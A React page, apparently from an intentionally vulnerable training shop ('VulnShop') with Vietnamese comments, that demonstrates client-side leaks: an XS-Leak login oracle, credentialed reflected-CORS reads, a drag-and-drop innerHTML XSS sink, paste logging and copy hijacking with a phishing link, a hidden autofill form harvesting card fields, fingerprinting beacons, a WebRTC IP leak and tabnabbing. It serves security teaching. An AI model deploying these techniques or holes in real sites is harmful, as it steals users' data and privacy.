import React, { useEffect, useRef, useState } from "react";

/* [VULN #29] insecure CORS handling (client), [#43] cross-origin info leak,
   [#44] XS-Leaks (login oracle via img onload), [#45/#46] tabnabbing links,
   [#47] drag&drop, [#48] clipboard, [#49] autofill theft, [#50] fingerprinting,
   [#51] tracking, [#52] WebRTC IP leak. */
export default function Leaks() {
  const [oracle, setOracle] = useState("(chưa test)");
  const [corsUrl, setCorsUrl] = useState("https://REPLACE-BACKEND.onrender.com/api/v2/users");
  const [corsOut, setCorsOut] = useState("");
  const [dropOut, setDropOut] = useState("");
  const [clipOut, setClipOut] = useState("(copy/paste vào trang này)");
  const [fp, setFp] = useState("");
  const [webrtc, setWebrtc] = useState("(chưa chạy)");
  const [autofill, setAutofill] = useState("(điền form thật rồi bấm Đọc)");
  const dropZone = useRef(null);

  /* [VULN #44] XS-Leak login oracle: img loads only when authenticated
     (200 -> onload; 401 -> onerror). No CORS needed - pure side channel. */
  function testLoginOracle() {
    setOracle("testing...");
    const img = new Image();
    img.onload = () => setOracle("ĐÃ ĐĂNG NHẬP (resource 200, cacheable) — leak không cần đọc response!");
    img.onerror = () => setOracle("CHƯA đăng nhập (401 -> onerror)");
    img.src = "/api/cache/profile/xsleak-" + Date.now() + ".css";
  }

  /* [VULN #29] client "trusts" the server's reflected CORS: nếu server reflect
     Origin + credentials (backend VulnShop làm thế), client trên origin BẤT KỲ
     đọc được dữ liệu có cookie. */
  async function testCors() {
    try {
      const r = await fetch(corsUrl, { credentials: "include" });
      const t = await r.text();
      setCorsOut(`status ${r.status}\nAccess-Control-Allow-Origin: ${r.headers.get("Access-Control-Allow-Origin")}\n${t.slice(0, 1500)}`);
    } catch (e) {
      setCorsOut("fetch error: " + e.message + "\n(nếu server KHÔNG reflect origin thì browser chặn đọc)");
    }
  }

  /* [VULN #47] drag & drop: dropped rich text/HTML rendered raw */
  useEffect(() => {
    const dz = dropZone.current;
    if (!dz) return;
    const over = (e) => e.preventDefault();
    const drop = (e) => {
      e.preventDefault();
      const html = e.dataTransfer.getData("text/html");
      const text = e.dataTransfer.getData("text");
      setDropOut({ html, text });
      // [VULN #47] sink: innerHTML of dropped HTML (drag-drop XSS)
      document.getElementById("dnd-render").innerHTML = html || text;
    };
    dz.addEventListener("dragover", over);
    dz.addEventListener("drop", drop);
    return () => {
      dz.removeEventListener("dragover", over);
      dz.removeEventListener("drop", drop);
    };
  }, []);

  /* [VULN #48] clipboard: paste logger + copy hijack */
  useEffect(() => {
    const onPaste = (e) => {
      const t = e.clipboardData.getData("text");
      setClipOut(`PASTE bắt được: ${t.slice(0, 500)}`);
      fetch("/api/telemetry", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ src: "leaks", kind: "paste", data: t.slice(0, 300) }) }).catch(() => {});
    };
    const onCopy = (e) => {
      // clipboard poisoning: đổi nội dung user copy thành payload
      e.clipboardData.setData("text/plain", "VulnShop promo! Vui lòng 'đăng nhập lại' tại https://example.com/phish");
      e.preventDefault();
      setClipOut((o) => o + "\nCOPY bị hijack: nội dung clipboard đã bị thay!");
    };
    window.addEventListener("paste", onPaste);
    document.addEventListener("copy", onCopy);
    return () => {
      window.removeEventListener("paste", onPaste);
      document.removeEventListener("copy", onCopy);
    };
  }, []);

  /* [VULN #50] fingerprinting */
  function fingerprint() {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "16px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("VulnShop-fp-@\u{1F511}", 2, 15);
    const dataUrl = c.toDataURL();
    let hash = 0;
    for (const ch of dataUrl) hash = (hash * 31 + ch.charCodeAt(0)) | 0;
    const info = {
      canvasHash: hash,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}@${screen.colorDepth}bit`,
      hardware: { cores: navigator.hardwareConcurrency, memoryGB: navigator.deviceMemory || navigator.deviceMemory, touch: navigator.maxTouchPoints },
      dnt: navigator.doNotTrack,
    };
    setFp(JSON.stringify(info, null, 2));
    fetch("/api/telemetry", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ src: "leaks", kind: "fingerprint", fp: info }) }).catch(() => {});
  }

  /* [VULN #52] WebRTC local/public IP leak qua ICE candidates */
  function webrtcLeak() {
    setWebrtc("thu thập ICE candidates...");
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("x");
      pc.onicecandidate = (e) => {
        if (!e.candidate) {
          setWebrtc(ips.size ? [...ips].join("\n") : "browser hiện dùng mDNS (.local) — IP thật bị che, xem console");
          return;
        }
        const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f-]+\.local)/i);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then((o) => pc.setLocalDescription(o));
    } catch (e) {
      setWebrtc("WebRTC error: " + e.message);
    }
  }

  /* [VULN #49] autofill theft - form ẩn dưới màn hình, browser autofill */
  function readAutofill() {
    const f = document.getElementById("autofill-form");
    const data = {};
    ["email", "name", "tel", "cc-name", "cc-number", "cc-exp"].forEach((n) => {
      const el = f.querySelector(`[name=${n}]`);
      if (el && el.value) data[n] = el.value;
    });
    setAutofill(JSON.stringify(data, null, 2));
  }

  return (
    <div>
      <h1>XS-Leaks & Client leaks lab</h1>

      <div className="card">
        <h2>Login-state oracle (#44 XS-Leaks)</h2>
        <div className="row">
          <button className="primary" onClick={testLoginOracle}>
            Test oracle
          </button>
          <span>{oracle}</span>
        </div>
        <p className="hint">
          Trang attacker chỉ cần <code>&lt;img src="/api/cache/profile/x.css"&gt;</code>: onload = nạn nhân đang
          login (vì endpoint trả 200 + cacheable), onerror = 401. Không cần đọc response.
        </p>
      </div>

      <div className="card">
        <h2>Insecure CORS handling (#29) & cross-origin leak (#43)</h2>
        <div className="row">
          <input value={corsUrl} onChange={(e) => setCorsUrl(e.target.value)} style={{ flex: 1 }} />
          <button className="primary" onClick={testCors}>
            fetch(credentials=include)
          </button>
        </div>
        <p className="hint">
          Điền URL backend trực tiếp (không qua proxy) — backend reflect mọi Origin + credentials nên client ở
          origin khác đọc được API có cookie. Từ domain attacker, đây là full data leak.
        </p>
        <pre>{corsOut || "(chưa chạy)"}</pre>
      </div>

      <div className="card">
        <h2>Tabnabbing / Reverse tabnabbing (#45/#46)</h2>
        <div className="row">
          {/* [VULN #45] target=_blank KHÔNG rel=noopener -> tab mới giữ window.opener */}
          <a href="/tabnab-attacker.html" target="_blank">
            Link target=_blank không rel (bấm, rồi ở tab mới bấm Hijack opener)
          </a>
          <a href="/tabnab-attacker.html" target="_blank" rel="noopener noreferrer">
            Link CÓ rel=noopener (an toàn — so sánh)
          </a>
        </div>
      </div>

      <div className="card">
        <h2>Drag & Drop (#47)</h2>
        <div ref={dropZone} className="comment" style={{ border: "2px dashed var(--accent)", textAlign: "center", padding: 20 }}>
          Kéo text/rich-content từ trang khác (hoặc từ Word/bảng chọn) vào đây
        </div>
        <div id="dnd-render" className="comment" />
        <pre>{dropOut ? JSON.stringify(dropOut, null, 1) : ""}</pre>
        <p className="hint">
          HTML kéo được render bằng innerHTML → XSS qua drag (kết hợp iframe overlay = drag hijack: nạn nhân kéo
          "văn bản" thực chất là payload attacker).
        </p>
      </div>

      <div className="card">
        <h2>Clipboard (#48)</h2>
        <p className="hint">
          Bấm vào trang rồi <b>Ctrl+C</b> (copy gì cũng bị thay) và <b>Ctrl+V</b> (nội dung bị log). Paste password
          đã lưu ở đâu đó để thử.
        </p>
        <textarea placeholder="paste vào đây" rows={2} style={{ width: "100%" }} />
        <pre>{clipOut}</pre>
      </div>

      <div className="card">
        <h2>Autofill theft (#49)</h2>
        <p className="hint">
          Form dưới màn hình với tên field chuẩn — browser autofill dữ liệu thật; JS đọc được. (Chrome cần 1 lần
          tương tác — bấm Đọc sau khi trang có focus.)
        </p>
        <form id="autofill-form" style={{ position: "absolute", left: "-9999px", top: "-9999px", opacity: 0 }} autoComplete="on">
          <input name="email" type="email" autoComplete="email" />
          <input name="name" autoComplete="name" />
          <input name="tel" autoComplete="tel" />
          <input name="cc-name" autoComplete="cc-name" />
          <input name="cc-number" autoComplete="cc-number" />
          <input name="cc-exp" autoComplete="cc-exp" />
        </form>
        <button onClick={readAutofill}>Đọc autofill</button>
        <pre>{autofill}</pre>
      </div>

      <div className="card">
        <h2>Browser fingerprinting (#50) & tracking (#51)</h2>
        <div className="row">
          <button className="primary" onClick={fingerprint}>
            Fingerprint tôi
          </button>
          <span className="hint">
            tracker.js đã chạy từ index.html — uid <code>vulnshop_track_uid</code> trong localStorage + beacon tới
            /api/telemetry. Xem: nút Xem attacker view ở trang Storage lab.
          </span>
        </div>
        <pre>{fp || "(chưa chạy)"}</pre>
      </div>

      <div className="card">
        <h2>WebRTC IP leakage (#52)</h2>
        <div className="row">
          <button onClick={webrtcLeak}>Thu ICE candidates (STUN Google)</button>
        </div>
        <pre>{webrtc}</pre>
        <p className="hint">VPN user vẫn leak IP local/public qua mDNS/ICE — classic deanonymization.</p>
      </div>
    </div>
  );
}
